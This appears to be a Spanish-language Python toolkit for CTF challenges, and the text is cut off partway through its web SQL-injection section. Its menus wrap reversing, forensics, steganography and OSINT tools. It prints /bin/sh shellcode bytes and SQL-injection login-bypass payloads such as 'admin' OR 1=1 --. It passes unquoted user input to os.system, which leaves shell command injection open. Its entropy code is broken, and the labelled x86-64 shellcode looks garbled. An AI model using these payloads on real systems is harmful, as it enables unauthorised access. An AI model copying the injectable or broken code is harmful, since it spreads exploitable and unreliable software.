#!/usr/bin/env python3
"""
MÓDULO COMPLETO CTF - Todas las Categorías
Versión 6.3 (SQLi Payloads de Autenticación expandidos)
Incluye: Reversing, Pwn, Crypto, Forensics, Steganography, OSINT, Web, Hardware
"""

import os
import sys
import subprocess
import struct
import string
from pathlib import Path

# Importaciones para Web y Crypto
import requests 
import urllib.parse
import base64
import hashlib
import binascii
import json
import re

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
RESET = '\033[0m'

# ═══════════════════════════════════════════════════════════════
# FUNCIÓN AUXILIAR: LIMPIAR CONSOLA
# ═══════════════════════════════════════════════════════════════

def clear_screen():
    """Limpia la consola para sistemas Unix y Windows."""
    os.system('cls' if os.name == 'nt' else 'clear')

# ═══════════════════════════════════════════════════════════════
# FUNCIÓN AUXILIAR: VERIFICACIÓN DE HERRAMIENTAS
# ═══════════════════════════════════════════════════════════════

def check_tool_availability(tool_name, module_name=""):
    """Verifica si una herramienta de línea de comandos está instalada."""
    try:
        # Usamos check=True para lanzar excepción si el código de salida es != 0
        subprocess.run([tool_name, "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        print(f"\n{RED}❌ HERRAMIENTA FALTANTE: '{tool_name}' no está instalada o no está en el PATH.")
        if module_name:
            print(f"   Por favor, instala '{tool_name}' para usar este módulo de {module_name}.{RESET}")
        return False


# ═══════════════════════════════════════════════════════════════
# MÓDULO 1: REVERSING 
# ═══════════════════════════════════════════════════════════════

def reversing_strings_analysis(binary_path):
    """Análisis de strings en binario"""
    clear_screen()
    print(f"\n{YELLOW}═══ STRING ANALYSIS ═══{RESET}\n")
    
    if not os.path.exists(binary_path):
        print(f"{RED}❌ Archivo no encontrado{RESET}")
        return
    
    # Verificación de 'strings'
    if not check_tool_availability('strings', 'Reversing'):
        return

    print("[1/5] Extrayendo strings (Guardando en /tmp/strings_output.txt)...")
    os.system(f"strings {binary_path} > /tmp/strings_output.txt")
    
    print("\n[2/5] Buscando Flags/Keys (Regex avanzada)...")
    os.system(f"grep -E -i 'flag|key|password|secret|license|token' /tmp/strings_output.txt | head -20")
    
    print("\n[3/5] Buscando Cadenas Base64 (longitud > 20, formato '==')...")
    os.system(f"grep -E '[A-Za-z0-9+/]{{20,}}=*$' /tmp/strings_output.txt | head -10")
    
    print("\n[4/5] Buscando URLs/Endpoints...")
    os.system(f"grep -E 'http|https|ftp|api|@' /tmp/strings_output.txt | head -10")
    
    print("\n[5/5] Strings muy largos (posible código o data oculta)...")
    os.system(f"strings {binary_path} | awk 'length>40' | head -10")
    
    print(f"\n💾 Output completo: /tmp/strings_output.txt")


def reversing_binary_info(binary_path):
    """Información del binario"""
    clear_screen()
    print(f"\n{YELLOW}═══ BINARY ANALYSIS ═══{RESET}\n")
    
    if not os.path.exists(binary_path):
        print(f"{RED}❌ Archivo no encontrado{RESET}")
        return
    
    print("[1/5] File type...")
    os.system(f"file {binary_path}")
    
    print("\n[2/5] File size and permissions...")
    os.system(f"ls -lh {binary_path}")
    
    print("\n[3/5] Checksums...")
    os.system(f"md5sum {binary_path}")
    os.system(f"sha256sum {binary_path}")
    
    print("\n[4/5] Binary protections (checksec)...")
    if check_tool_availability('checksec'):
        os.system(f"checksec --file={binary_path}")
    else:
        print(f"{RED}❌ checksec no disponible.{RESET}")
    
    print("\n[5/5] Symbols (Funciones y Variables)...")
    os.system(f"nm {binary_path} 2>/dev/null | grep -E 'T|D' | head -20")


def reversing_disassemble(binary_path):
    """Desensamblado básico"""
    clear_screen()
    print(f"\n{YELLOW}═══ DISASSEMBLY ═══{RESET}\n")
    
    if not os.path.exists(binary_path):
        print(f"{RED}❌ Archivo no encontrado{RESET}")
        return
        
    if not check_tool_availability('objdump', 'Reversing'):
        return
    
    print("[1/4] Usando objdump (Guardando en /tmp/disasm.txt)...")
    os.system(f"objdump -d {binary_path} > /tmp/disasm.txt 2>/dev/null")
    os.system(f"objdump -d {binary_path} | grep -A 10 '<main>' 2>/dev/null")
    
    print("\n[2/4] Buscando llamadas interesantes (strcmp, printf, etc.)...")
    os.system(f"objdump -d {binary_path} 2>/dev/null | grep -E 'call.*(strcmp|printf|memcpy|read|write)'")
    
    print("\n[3/4] Buscando funciones relacionadas con la solución...")
    os.system(f"objdump -t {binary_path} 2>/dev/null | grep -E 'flag|password|key|secret|validate'")
    
    print("\n[4/4] Secciones del binario (readelf)...")
    if check_tool_availability('readelf'):
         os.system(f"readelf -S {binary_path} 2>/dev/null | head -10")
    else:
        print(f"{RED}❌ readelf no disponible.{RESET}")
    
    print(f"\n💾 Desensamblado completo: /tmp/disasm.txt")


def reversing_hex_dump(binary_path):
    """Hex dump y búsqueda de patrones"""
    clear_screen()
    print(f"\n{YELLOW}═══ HEX DUMP ANALYSIS ═══{RESET}\n")
    
    if not os.path.exists(binary_path):
        print(f"{RED}❌ Archivo no encontrado{RESET}")
        return
    
    print("[1/3] Primeros 256 bytes...")
    os.system(f"xxd {binary_path} | head -16")
    
    print("\n[2/3] Buscando magic bytes conocidos...")
    try:
        with open(binary_path, 'rb') as f:
            header = f.read(16)
            hex_header = header.hex()
            
            magic_bytes = {
                '7f454c46': 'ELF Binary',
                '4d5a': 'Windows PE',
                '504b0304': 'ZIP Archive',
                '89504e47': 'PNG Image',
                'ffd8ffe0': 'JPEG Image',
                '25504446': 'PDF Document',
                '1f8b': 'GZIP Compressed'
            }
            
            detected = False
            for magic, desc in magic_bytes.items():
                if hex_header.startswith(magic):
                    print(f"✅ Detectado: {desc}")
                    detected = True
            if not detected:
                 print("⚠️ Magic bytes estándar no detectados.")
    except Exception as e:
        print(f"❌ Error leyendo archivo: {e}")
        
    print("\n[3/3] Últimos 256 bytes (puede haber data al final)...")
    os.system(f"xxd {binary_path} | tail -16")


def reversing_ltrace_strace(binary_path):
    """Trazado de llamadas"""
    clear_screen()
    print(f"\n{YELLOW}═══ DYNAMIC ANALYSIS ═══{RESET}\n")
    
    # Check tool availability for ltrace/strace
    ltrace_available = check_tool_availability('ltrace', 'Reversing')
    strace_available = check_tool_availability('strace', 'Reversing')

    if ltrace_available:
        print("[1/2] ltrace (library calls)...")
        print("Ejecutando binario con ltrace...")
        os.system(f"timeout 5 ltrace {binary_path} 2>&1 | head -30")
    else:
        print(f"{RED}❌ ltrace no disponible. Saltando ltrace.{RESET}")
    
    if strace_available:
        print("\n[2/2] strace (system calls)...")
        print("Ejecutando binario con strace...")
        os.system(f"timeout 5 strace {binary_path} 2>&1 | head -30")
    else:
        print(f"{RED}❌ strace no disponible. Saltando strace.{RESET}")


def reversing_menu():
    """Menú de Reversing (Actualizado con checks)"""
    while True:
        clear_screen()
        print(f"\n{BLUE}{'═'*60}")
        print("REVERSING ENGINEERING")
        print(f"{'═'*60}{RESET}")
        print("1. 📝 String Analysis (Mejorado)")
        print("2. 🔍 Binary Info (file, checksec, symbols)")
        print("3. 💻 Disassembly (objdump, readelf)")
        print("4. 🔢 Hex Dump Analysis")
        print("5. 🔬 Dynamic Analysis (ltrace/strace)")
        print("6. 🛠️  Abrir en Ghidra (Requiere Ghidra)")
        print("7. 🛠️  Abrir en radare2 (Requiere r2)")
        print("8. 📦 Análisis Completo")
        print("9. ← Volver")
        
        choice = input(f"\n{CYAN}Opción: {RESET}").strip()
        
        if choice == '9':
            break
        
        if choice in ['1', '2', '3', '4', '5', '8']:
            binary = input("Ruta del binario: ").strip()
            
            if choice == '1':
                reversing_strings_analysis(binary)
            elif choice == '2':
                reversing_binary_info(binary)
            elif choice == '3':
                reversing_disassemble(binary)
            elif choice == '4':
                reversing_hex_dump(binary)
            elif choice == '5':
                reversing_ltrace_strace(binary)
            elif choice == '8':
                print(f"\n{GREEN}[*] Ejecutando análisis completo...{RESET}\n")
                reversing_binary_info(binary)
                input(f"\n{YELLOW}Presiona ENTER para continuar con String Analysis...{RESET}")
                reversing_strings_analysis(binary)
                input(f"\n{YELLOW}Presiona ENTER para continuar con Hex Dump...{RESET}")
                reversing_hex_dump(binary)
                input(f"\n{YELLOW}Presiona ENTER para continuar con Disassembly...{RESET}")
                reversing_disassemble(binary)
                print(f"\n{GREEN}✅ Análisis completo guardado en /tmp/{RESET}")
            
            if choice != '8': 
                 input(f"\n{YELLOW}Presiona ENTER para volver al menú de Reversing...{RESET}")

        elif choice == '6':
            if not check_tool_availability('ghidra', 'Reversing'):
                input(f"\n{YELLOW}Presiona ENTER para volver...{RESET}")
                continue
            binary = input("Ruta del binario: ").strip()
            print(f"\n{GREEN}[*] Abriendo en Ghidra...{RESET}")
            os.system(f"ghidra {binary} &")
            input(f"\n{YELLOW}Presiona ENTER para volver...{RESET}")
        
        elif choice == '7':
            if not check_tool_availability('r2', 'Reversing'): 
                input(f"\n{YELLOW}Presiona ENTER para volver...{RESET}")
                continue
            binary = input("Ruta del binario: ").strip()
            print(f"\n{GREEN}[*] Abriendo en radare2...{RESET}")
            os.system(f"r2 {binary}")
            input(f"\n{YELLOW}Presiona ENTER para volver...{RESET}")

# ═══════════════════════════════════════════════════════════════
# MÓDULO 2: PWN / BINARY EXPLOITATION 
# ═══════════════════════════════════════════════════════════════

def pwn_checksec(binary_path):
    """Verificar protecciones del binario"""
    clear_screen()
    print(f"\n{YELLOW}═══ SECURITY CHECKS ═══{RESET}\n")
    if check_tool_availability('checksec'):
        os.system(f"checksec --file={binary_path}")
    else:
        print(f"{RED}❌ checksec no disponible.{RESET}")


def pwn_buffer_overflow_check(binary_path):
    """Detectar posibles buffer overflows y dar el patrón."""
    clear_screen()
    print(f"\n{YELLOW}═══ BUFFER OVERFLOW DETECTION ═══{RESET}\n")
    
    print("[1/3] Buscando funciones peligrosas (objdump)...")
    if check_tool_availability('objdump', 'PWN'):
        dangerous_funcs = ['gets', 'strcpy', 'sprintf', 'scanf', 'vsprintf', 'read', 'memcpy']
        found = False
        for func in dangerous_funcs:
            result = subprocess.run(
                f"objdump -d {binary_path} 2>/dev/null | grep -i {func}",
                shell=True,
                capture_output=True,
                text=True
            )
            if result.stdout:
                print(f"⚠️  Encontrado: {func}")
                found = True
        if not found:
            print("✅ No se encontraron funciones peligrosas comunes.")
    else:
        print(f"{RED}❌ objdump no está disponible. No se puede analizar.{RESET}")
    
    print("\n[2/3] Verificando Stack Canary (checksec)...")
    if check_tool_availability('checksec'):
        os.system(f"checksec --file={binary_path} | grep -i 'stack'")
    else:
        print(f"{RED}❌ checksec no está disponible.{RESET}")
    
    print("\n[3/3] Generando Patrón Cíclico para GDB/Pwntools...")
    print(f"{MAGENTA}Usar este patrón para calcular el offset al EIP/RIP.{RESET}")
    print("Pattern (160 bytes):")
    pattern = ""
    for i in range(26):
        for j in range(26):
            for k in range(10):
                pattern += chr(65 + i) + chr(97 + j) + str(k)
                if len(pattern) >= 160:
                    break
            if len(pattern) >= 160:
                break
        if len(pattern) >= 160:
            break
    print(pattern[:160])

def pwn_rop_gadgets(binary_path):
    """Buscar ROP gadgets"""
    clear_screen()
    print(f"\n{YELLOW}═══ ROP GADGETS ═══{RESET}\n")
    
    if not check_tool_availability('ROPgadget', 'PWN'):
        return
        
    print("Buscando gadgets útiles (pop rdi; ret, etc.)...")
    print(f"{MAGENTA}Llamada completa: ROPgadget --binary {binary_path}{RESET}")
    os.system(f"ROPgadget --binary {binary_path} 2>/dev/null | grep -E 'pop rdi|pop rsi|pop rdx|syscall|ret$' | head -30")


def pwn_shellcode_menu():
    """Muestra shellcodes comunes."""
    clear_screen()
    print(f"\n{YELLOW}═══ COMMON SHELLCODES ═══{RESET}\n")
    
    print(f"{CYAN}[1] Linux x86-64 /bin/sh (23 bytes):{RESET}")
    print("\\x48\\x31\\xff\\x48\\x31\\xc0\\xb0\\x01\\x6a\\x0b\\x5e\\x5f\\x6a\\x3b\\x58\\x99\\x5f\\x6a\\x3b\\x58\\x99\\xcd\\x80")
    
    print(f"\n{CYAN}[2] Linux x86 /bin/sh (25 bytes):{RESET}")
    print("\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80")
    
    print(f"\n{RED}💡 CONSEJO:{RESET} Usa Msfvenom o Pwntools para generar shellcodes más complejos o específicos para la arquitectura.")

def pwn_menu():
    """Menú de PWN"""
    while True:
        clear_screen()
        print(f"\n{BLUE}{'═'*60}")
        print("PWN / BINARY EXPLOITATION")
        print(f"{'═'*60}{RESET}")
        print("1. 🛡️  Check Security (checksec)")
        print("2. 💥 Buffer Overflow Check & Pattern")
        print("3. 🔗 ROP Gadgets Search (ROPgadget)")
        print("4. 📝 Shellcode List")
        print("9. ← Volver")
        
        choice = input(f"\n{CYAN}Opción: {RESET}").strip()
        
        if choice == '9':
            break
        
        if choice in ['1', '2', '3']:
            binary = input("Ruta del binario: ").strip()
            
            if choice == '1':
                pwn_checksec(binary)
            elif choice == '2':
                pwn_buffer_overflow_check(binary)
            elif choice == '3':
                pwn_rop_gadgets(binary)
            
            input(f"\n{YELLOW}Presiona ENTER para volver al menú de PWN...{RESET}")
        
        elif choice == '4':
            pwn_shellcode_menu()
            input(f"\n{YELLOW}Presiona ENTER para volver al menú de PWN...{RESET}")

# ═══════════════════════════════════════════════════════════════
# MÓDULO 3: FORENSICS 
# ═══════════════════════════════════════════════════════════════

def forensics_file_analysis(file_path):
    """Análisis forense de archivo"""
    clear_screen()
    print(f"\n{YELLOW}═══ FILE FORENSICS ═══{RESET}\n")
    
    if not os.path.exists(file_path):
        print(f"{RED}❌ Archivo no encontrado{RESET}")
        return
    
    print("[1/6] File type and magic bytes...")
    os.system(f"file {file_path}")
    os.system(f"xxd {file_path} | head -3")
    
    print("\n[2/6] Metadata (exiftool)...")
    if check_tool_availability('exiftool'):
        os.system(f"exiftool {file_path} 2>/dev/null | head -15")
    else:
        print(f"{RED}❌ exiftool no disponible.{RESET}")
    
    print("\n[3/6] Binwalk (embedded files)...")
    if check_tool_availability('binwalk'):
        os.system(f"binwalk {file_path}")
    else:
        print(f"{RED}❌ binwalk no disponible.{RESET}")
    
    print("\n[4/6] Foremost (file carving, si aplica - NO EJECUCIÓN)...")
    if check_tool_availability('foremost'):
        print(f"💡 Comando para ejecución: {GREEN}foremost -o /tmp/foremost_out {file_path}{RESET}")
    else:
        print(f"{RED}❌ foremost no disponible.{RESET}")
    
    print("\n[5/6] Strings analysis (flags)...")
    if check_tool_availability('strings'):
        os.system(f"strings {file_path} | grep -i flag")
    else:
        print(f"{RED}❌ strings no disponible.{RESET}")
    
    print("\n[6/6] Entropy check (detectar encriptación)...")
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
            if len(data) > 0:
                byte_counts = [0] * 256
                for byte in data:
                    byte_counts[byte] += 1
                
                entropy = 0
                for count in byte_counts:
                    if count > 0:
                        p = count / len(data)
                        # Cálculo de Shannon Entropy (log base 2)
                        entropy -= p * (p.bit_length() - 1)
                
                print(f"Entropy: {entropy:.2f} (>7.5 = probablemente encriptado)")
    except Exception as e:
        print(f"Error calculando entropy: {e}")

def forensics_memory_strings(dump_path):
    """Análisis de memoria dump"""
    clear_screen()
    print(f"\n{YELLOW}═══ MEMORY DUMP ANALYSIS ═══{RESET}\n")
    
    if not os.path.exists(dump_path):
        print(f"{RED}❌ Archivo no encontrado{RESET}")
        return
        
    if not check_tool_availability('strings'):
        return
        
    print("[1/3] Buscando passwords...")
    os.system(f"strings {dump_path} | grep -i 'password\\|passwd\\|pwd\\|secret' | head -20")
    
    print("\n[2/3] Buscando flags...")
    os.system(f"strings {dump_path} | grep -E 'flag\\{{|FLAG\\{{|CTF\\{{' | head -20")
    
    print("\n[3/3] Buscando URLs/EndPoints...")
    os.system(f"strings {dump_path} | grep -E 'http://|https://|/api/' | head -20")

def forensics_disk_analysis(image_path):
    """Análisis de imagen de disco (Solo instrucciones, la ejecución requiere sudo)"""
    clear_screen()
    print(f"\n{YELLOW}═══ DISK IMAGE ANALYSIS (REQUIERE SUDO) ═══{RESET}\n")
    
    if not os.path.exists(image_path):
        print(f"{RED}❌ Archivo no encontrado{RESET}")
        return
        
    if not check_tool_availability('mount', 'Forensics (root)'):
        return
    
    mount_point = "/tmp/disk_mount"
    print(f"{MAGENTA}Para montar la imagen:{RESET}")
    print(f"1. Crear directorio: {GREEN}mkdir -p {mount_point}{RESET}")
    print(f"2. Montar (Ej: raw/ext4): {GREEN}sudo mount -o loop {image_path} {mount_point}{RESET}")
    
    print(f"\n{MAGENTA}Comandos de Análisis (Después de montar):{RESET}")
    print(f"   -> Listar archivos: {GREEN}ls -laR {mount_point} | head -50{RESET}")
    print(f"   -> Buscar archivos ocultos: {GREEN}find {mount_point} -name '.*'{RESET}")
    print(f"   -> Buscar strings: {GREEN}grep -i 'flag' {mount_point}/path/to/file{RESET}")
    
    print(f"\n{RED}¡RECUERDA DESMONTAR AL TERMINAR!{RESET}")
    print(f"   -> {RED}sudo umount {mount_point}{RESET}")


def forensics_menu():
    """Menú de Forensics"""
    while True:
        clear_screen()
        print(f"\n{BLUE}{'═'*60}")
        print("FORENSICS")
        print(f"{'═'*60}{RESET}")
        print("1. 🔍 File Analysis (completo)")
        print("2. 💾 Memory Dump Analysis")
        print("3. 💿 Disk Image Analysis (Requiere sudo)")
        print("4. 📦 Extract Embedded Files (binwalk)")
        print("5. 🖼️  Image Metadata (exiftool)")
        print("6. 🔎 File Carving (foremost)")
        print("9. ← Volver")
        
        choice = input(f"\n{CYAN}Opción: {RESET}").strip()
        
        if choice == '9':
            break
        
        file_path = input("Ruta del archivo: ").strip()
        
        if choice == '1':
            forensics_file_analysis(file_path) 
        elif choice == '2':
            forensics_memory_strings(file_path)
        elif choice == '3':
            forensics_disk_analysis(file_path)
        elif choice == '4':
            if not check_tool_availability('binwalk', 'Forensics'):
                input(f"\n{YELLOW}Presiona ENTER para volver...{RESET}")
                continue
            clear_screen()
            output = input("Directorio output (default /tmp/binwalk): ").strip() or "/tmp/binwalk"
            os.system(f"binwalk -e --directory={output} {file_path}")
            print(f"\n✅ Archivos en: {output}")
        elif choice == '5':
            if not check_tool_availability('exiftool', 'Forensics'):
                input(f"\n{YELLOW}Presiona ENTER para volver...{RESET}")
                continue
            clear_screen()
            os.system(f"exiftool {file_path}")
        elif choice == '6':
            if not check_tool_availability('foremost', 'Forensics'):
                input(f"\n{YELLOW}Presiona ENTER para volver...{RESET}")
                continue
            clear_screen()
            output = input("Directorio output (default /tmp/foremost): ").strip() or "/tmp/foremost"
            os.system(f"foremost -o {output} {file_path}")
            print(f"\n✅ Archivos en: {output}")
        
        input(f"\n{YELLOW}Presiona ENTER para volver al menú de Forensics...{RESET}")

# ═══════════════════════════════════════════════════════════════
# MÓDULO 4: STEGANOGRAPHY
# ═══════════════════════════════════════════════════════════════

def stego_image_analysis(image_path):
    """Análisis de esteganografía en imágenes"""
    clear_screen()
    print(f"\n{YELLOW}═══ IMAGE STEGANOGRAPHY ═══{RESET}\n")
    
    if not os.path.exists(image_path):
        print(f"{RED}❌ Archivo no encontrado{RESET}")
        return
    
    print("[1/5] Metadata (exiftool)...")
    if check_tool_availability('exiftool'):
        os.system(f"exiftool {image_path} 2>/dev/null | head -15")
    else:
        print(f"{RED}❌ exiftool no disponible.{RESET}")
    
    print("\n[2/5] Strings (flags)...")
    if check_tool_availability('strings'):
        os.system(f"strings {image_path} | grep -i flag")
    else:
        print(f"{RED}❌ strings no disponible.{RESET}")
    
    print("\n[3/5] Binwalk (embedded files)...")
    if check_tool_availability('binwalk'):
        os.system(f"binwalk {image_path}")
    else:
        print(f"{RED}❌ binwalk no disponible.{RESET}")
    
    print("\n[4/5] Steghide extract (sin password)...")
    if check_tool_availability('steghide'):
        os.system(f"steghide extract -sf {image_path} -p '' < /dev/null 2>/dev/null || echo 'Requiere password o archivo vacío.'")
    else:
        print(f"{RED}❌ steghide no disponible.{RESET}")
    
    print("\n[5/5] zsteg (LSB analysis)...")
    if check_tool_availability('zsteg'):
        os.system(f"zsteg {image_path} 2>/dev/null | head -20")
    else:
        print(f"{RED}❌ zsteg no disponible.{RESET}")


def stego_audio_analysis(audio_path):
    """Análisis de audio"""
    clear_screen()
    print(f"\n{YELLOW}═══ AUDIO STEGANOGRAPHY ═══{RESET}\n")
    
    if not os.path.exists(audio_path):
        print(f"{RED}❌ Archivo no encontrado{RESET}")
        return
        
    print("[1/3] Metadata (exiftool)...")
    if check_tool_availability('exiftool'):
        os.system(f"exiftool {audio_path} 2>/dev/null | head -10")
    else:
        print(f"{RED}❌ exiftool no disponible.{RESET}")
    
    print("\n[2/3] Spectogram analysis (Audacity)...")
    print(f"{GREEN}Abriendo en Audacity para análisis visual (espectrograma)...{RESET}")
    os.system(f"audacity {audio_path} &") # Esto asume que audacity está instalado y en el PATH
    
    print("\n[3/3] Strings (flags)...")
    if check_tool_availability('strings'):
        os.system(f"strings {audio_path} | grep -i flag")
    else:
        print(f"{RED}❌ strings no disponible.{RESET}")


def stego_menu():
    """Menú de Steganography"""
    while True:
        clear_screen()
        print(f"\n{BLUE}{'═'*60}")
        print("STEGANOGRAPHY")
        print(f"{'═'*60}{RESET}")
        print("1. 🖼️  Image Analysis (completo)")
        print("2. 🎵 Audio Analysis (Audacity)")
        print("3. 📄 Text/Document Strings")
        print("4. 🔓 Steghide Extract (steghide)")
        print("5. 🔍 LSB Analysis (zsteg)")
        print("6. 📊 Stegsolve (tool)")
        print("9. ← Volver")
        
        choice = input(f"\n{CYAN}Opción: {RESET}").strip()
        
        if choice == '9':
            break
        
        if choice in ['1', '2', '3', '4', '5', '6']:
            file_path = input("Ruta del archivo: ").strip()
        
            if choice == '1':
                stego_image_analysis(file_path)
            elif choice == '2':
                stego_audio_analysis(file_path)
            elif choice == '3':
                clear_screen()
                print(f"\n{YELLOW}═══ TEXT/DOCUMENT STRINGS ═══{RESET}\n")
                if check_tool_availability('strings'):
                    os.system(f"strings {file_path} | head -50")
                else:
                    print(f"{RED}❌ strings no disponible.{RESET}")
            elif choice == '4':
                if not check_tool_availability('steghide', 'Steganography'):
                    input(f"\n{YELLOW}Presiona ENTER para volver...{RESET}")
                    continue
                clear_screen()
                password = input("Password (Enter si ninguno): ").strip()
                cmd = f"steghide extract -sf {file_path}"
                if password:
                    cmd += f" -p {password}"
                else:
                    cmd += f" -p '' < /dev/null" 
                
                os.system(cmd)
                print(f"\n{GREEN}✅ Intento de extracción completado. Revisa tu directorio actual.{RESET}")
            elif choice == '5':
                if not check_tool_availability('zsteg', 'Steganography'):
                    input(f"\n{YELLOW}Presiona ENTER para volver...{RESET}")
                    continue
                clear_screen()
                print(f"\n{YELLOW}═══ LSB ANALYSIS (zsteg) ═══{RESET}\n")
                os.system(f"zsteg {file_path}")
            elif choice == '6':
                clear_screen()
                if not check_tool_availability('stegsolve'):
                    input(f"\n{YELLOW}Presiona ENTER para volver...{RESET}")
                    continue
                print(f"\n{GREEN}[*] Abriendo Stegsolve...{RESET}")
                os.system(f"stegsolve {file_path} &")
                input(f"\n{YELLOW}Presiona ENTER para volver...{RESET}")
            
            input(f"\n{YELLOW}Presiona ENTER para volver al menú de Steganography...{RESET}")


# ═══════════════════════════════════════════════════════════════
# MÓDULO 5: OSINT
# ═══════════════════════════════════════════════════════════════

def osint_whois(domain):
    """WHOIS lookup"""
    clear_screen()
    print(f"\n{YELLOW}═══ WHOIS LOOKUP ═══{RESET}\n")
    if check_tool_availability('whois'):
        os.system(f"whois {domain}")
    else:
        print(f"{RED}❌ whois no disponible.{RESET}")

def osint_dns(domain):
    """DNS enumeration"""
    clear_screen()
    print(f"\n{YELLOW}═══ DNS ENUMERATION ═══{RESET}\n")
    
    if not check_tool_availability('dig'):
        print(f"{RED}❌ dig no disponible.{RESET}")
        return
    
    print("[1/4] A records...")
    os.system(f"dig A {domain} +short")
    
    print("\n[2/4] MX records...")
    os.system(f"dig MX {domain} +short")
    
    print("\n[3/4] TXT records...")
    os.system(f"dig TXT {domain} +short")
    
    print("\n[4/4] NS records...")
    os.system(f"dig NS {domain} +short")

def osint_subdomain_enum(domain):
    """Enumeración de subdominios"""
    clear_screen()
    print(f"\n{YELLOW}═══ SUBDOMAIN ENUMERATION ═══{RESET}\n")
    
    if not check_tool_availability('host'):
        print(f"{RED}❌ host no disponible.{RESET}")
        return
    
    # Esta es una versión simplificada y educativa. Herramientas reales son 'subfinder', 'assetfinder', etc.
    print(f"{RED}⚠️ ATENCIÓN: Esta es una prueba simplificada. Usa herramientas como subfinder/assetfinder para una enumeración real.{RESET}")
    print(f"Probando subdominios comunes para {domain}...")
    
    common = ['www', 'mail', 'ftp', 'admin', 'blog', 'dev', 'api', 'test', 'staging', 'web']
    for sub in common:
        os.system(f"host {sub}.{domain} 2>/dev/null | grep 'has address'")

def osint_menu():
    """Menú de OSINT"""
    while True:
        clear_screen()
        print(f"\n{BLUE}{'═'*60}")
        print("OSINT (Open Source Intelligence)")
        print(f"{'═'*60}{RESET}")
        print("1. 🔍 WHOIS Lookup")
        print("2. 🌐 DNS Enumeration")
        print("3. 📡 Subdomain Enumeration (Simple)")
        print("4. 📧 Email Harvesting (theHarvester)")
        print("5. 🗺️  Geolocation (IP)")
        print("6. 📸 Social Media Search (Link)")
        print("9. ← Volver")
        
        choice = input(f"\n{CYAN}Opción: {RESET}").strip()
        
        if choice == '9':
            break
        
        if choice in ['1', '2', '3', '4']:
            domain = input("Domain: ").strip()
            
            if choice == '1':
                osint_whois(domain)
            elif choice == '2':
                osint_dns(domain)
            elif choice == '3':
                osint_subdomain_enum(domain)
            elif choice == '4':
                clear_screen()
                print(f"\n{YELLOW}═══ EMAIL HARVESTING (theHarvester) ═══{RESET}\n")
                if check_tool_availability('theharvester', 'OSINT'):
                    os.system(f"theharvester -d {domain} -b google,baidu,linkedin -l 100 2>/dev/null")
                else:
                    print(f"{RED}❌ theHarvester no disponible. Instálalo primero.{RESET}")
            
        elif choice == '5':
            ip = input("IP address: ").strip()
            clear_screen()
            print(f"\n{YELLOW}═══ GEOLOCATION ═══{RESET}\n")
            if check_tool_availability('curl'):
                os.system(f"curl ipinfo.io/{ip} 2>/dev/null")
            else:
                print(f"{RED}❌ curl no disponible.{RESET}")

        elif choice == '6':
            username = input("Username a buscar (ej: john_doe): ").strip()
            clear_screen()
            print(f"\n{YELLOW}═══ SOCIAL MEDIA SEARCH ═══{RESET}\n")
            print(f"💡 Sugerencia: Usa {GREEN}sherlock {username}{RESET} en una terminal separada.")
            print(f"Links manuales para: {username}")
            print(f"   -> Facebook: https://facebook.com/{username}")
            print(f"   -> Instagram: https://instagram.com/{username}")
            print(f"   -> Twitter/X: https://x.com/{username}")
        
        input(f"\n{YELLOW}Presiona ENTER para volver al menú de OSINT...{RESET}")

# ═══════════════════════════════════════════════════════════════
# MÓDULO 6: WEB (SQLi Payloads mejorados)
# ═══════════════════════════════════════════════════════════════

def web_http_request_analysis(url, method='GET', headers=None, data=None):
    """Realiza una petición HTTP y muestra la respuesta clave."""
    clear_screen()
    print(f"\n{YELLOW}═══ HTTP REQUEST ANALYSIS ({method}) ═══{RESET}\n")
    print(f"{CYAN}URL:{RESET} {url}")
    
    try:
        if method == 'GET':
            response = requests.get(url, headers=headers, timeout=10)
        elif method == 'POST':
            response = requests.post(url, headers=headers, data=data, timeout=10)
        else:
            print(f"{RED}Método HTTP no soportado.{RESET}")
            return
            
        print(f"\n{GREEN}✅ Petición Exitosa{RESET}")
        print(f"Status Code: {response.status_code}")
        print(f"Headers (Key): {response.headers.get('Server', 'N/A')}")
        print(f"Content-Length: {response.headers.get('Content-Length', 'N/A')}")
        
        print(f"\n{MAGENTA}Cuerpo de Respuesta (Primeras 20 líneas):{RESET}")
        print('\n'.join(response.text.splitlines()[:20]))
        
        # Búsqueda de la bandera en el cuerpo
        flag_search = re.search(r'(flag|key|token|password)[\s]*[:=][\s]*[\w\{\}]+', response.text, re.IGNORECASE)
        if flag_search:
            print(f"\n{RED}🔥 Posible Flag Encontrada:{RESET} {flag_search.group(0)}")
        
    except requests.exceptions.RequestException as e:
        print(f"{RED}❌ Error en la Petición: {e}{RESET}")
        
def web_sqli_payloads_list(url, param='id', value='1'):
    """Muestra una lista de payloads de SQLi para copiar/pegar."""
    clear_screen()
    print(f"\n{YELLOW}═══ SQL INJECTION PAYLOADS (MANUAL) ═══{RESET}\n")
    
    print(f"{MAGENTA}URL Base:{RESET} {url.split('?')[0]} | {CYAN}Parámetro:{RESET} {param}")
    print(f"{MAGENTA}Valor Original:{RESET} {value}")
    
    # ----------------------------------------------------------------------
    print(f"\n{RED}1. 🔑 AUTENTICACIÓN / LOGIN BYPASS (Usuario 'admin' o el primer registro):{RESET}")
    print(f"   💡 {YELLOW}OBJETIVO:{RESET} Loguearse como 'admin' o el primer usuario, asumiendo una query tipo: SELECT * FROM users WHERE user='[INPUT]' AND pass='[INPUT]'")
    print(f"   -> Username: {GREEN}admin' OR 1=1 -- {RESET} | Password: {GREEN}cualquiera{RESET}")
    print(f"   -> Username: {GREEN}admin' OR '1'='1' -- {RESET} | Password: {GREEN}cualquiera{RESET}")
    print(f"   -> Username: {GREEN}' OR 1=1 LIMIT 1 -- {RESET} | Password: {GREEN}cualquiera (MySQL){RESET}")
    print(f"   -> Username: {GREEN}admin' # {RESET} | Password: {GREEN}cualquiera (MySQL){RESET}")
    # ----------------------------------------------------------------------

    print(f"\n{BLUE}2. UNION INJECTION (Para determinar columnas y volcar data):{RESET}")
    print(f"   💡 {YELLOW}OBJETIVO:{RESET} Usar la sentencia UNION para inyectar una consulta que devuelva información de la DB.")
